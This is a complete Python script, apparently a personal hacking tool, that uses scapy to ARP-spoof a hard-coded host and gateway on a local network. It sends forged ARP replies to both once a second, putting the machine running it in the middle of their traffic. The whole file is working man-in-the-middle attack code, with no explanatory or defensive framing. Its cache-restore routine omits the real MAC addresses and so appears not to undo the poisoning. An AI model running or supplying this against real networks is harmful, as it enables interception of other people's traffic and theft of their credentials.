#!/usr/bin/python

import scapy.all as scapy
import time

    

def getTargetMAC(ip):
    arprequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    finalpacket = broadcast/arprequest
    answer = scapy.srp(finalpacket, iface='eth0', timeout=5, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)

def restoreMAC(targetIP, spoofIP):
    packet = scapy.ARP(op=2, hwdst=getTargetMAC(targetIP), pdst=targetIP, psrc=spoofIP)
    scapy.send(packet, verbose=False)

def spoofarp(targetIP, spoofIP):
    mac = getTargetMAC(targetIP)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=targetIP, psrc=spoofIP)
    scapy.send(packet, verbose=False)

def main():
    #target = input('Enter the target IP: ')
    #spoof = input('Enter the spoof IP: ')
    target = '192.168.1.143'
    spoof = '192.168.1.254'
    sendcount = 0
    try:
        while True:
            spoofarp(target, spoof)
            spoofarp(spoof, target)
            sendcount+=2
            print('\r[*] Packets Sent {}'.format(sendcount))
            time.sleep(1)
                    
    except KeyboardInterrupt:
        print('[-] Interrupt, restoring MAC addresses')
        restoreMAC(target, spoof)
        restoreMAC(spoof, target)
        print('[*] Done.')
        quit()
        
if __name__ == '__main__':
    main()